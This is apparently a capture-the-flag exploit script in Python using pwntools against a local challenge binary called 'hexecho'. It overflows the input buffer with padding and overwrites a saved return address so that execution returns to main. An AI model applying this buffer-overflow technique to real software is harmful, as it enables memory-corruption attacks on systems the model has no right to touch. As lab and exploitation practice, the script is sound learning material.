from pwn import *

elf = ELF('./hexecho')
io = process('./hexecho', env={'LD_PRELOAD': './libc.so.6'})

log.info('main: ' + hex(elf.symbols['main']))

size = 264 + 4 * 3
io.sendlineafter('Size: ', str(size))
io.sendlineafter('Data (hex): ', b'1')
for i in range(size-1-4*3):
    io.sendline(b'1')

for i in range(4*2):
    io.sendline(b'!')

io.sendline(p64(elf.symbols['main']))

io.interactive()
